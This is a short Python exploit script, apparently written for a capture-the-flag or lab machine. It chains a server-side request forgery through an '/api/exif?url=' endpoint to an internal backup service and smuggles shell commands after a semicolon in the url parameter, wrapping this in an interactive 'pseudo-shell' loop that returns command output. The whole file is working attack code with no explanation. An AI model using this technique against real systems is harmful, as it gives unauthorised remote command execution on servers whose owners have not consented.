import requests

proxies = { 'http':'http://127.0.0.1:8080' }
IP="10.10.254.10"
url=f"http://{IP}/api/exif?url=" 

def execute_cmd(cmd):
    
    ssrf=f"http://{IP}/api/exif?url=http://api-dev-backup:8080/exif?url=1;{cmd}"
    
    if ":" in cmd:
        directory = cmd.split(":")[0]
        cmd = cmd.split(":")[1]
        ssrf=f"http://{IP}/api/exif?url=http://api-dev-backup:8080/exif?url=1;cd /{directory};pwd;{cmd}"
    
    payload = url+ssrf
    response = requests.get(payload, proxies=proxies)
    output = response.text.split("----------------------------------------")[-1].strip()
    if "503" in response.text:
        return ""
    return output

while True:
    cmd = input("pseudo-shell$ ")
    print(execute_cmd(cmd))
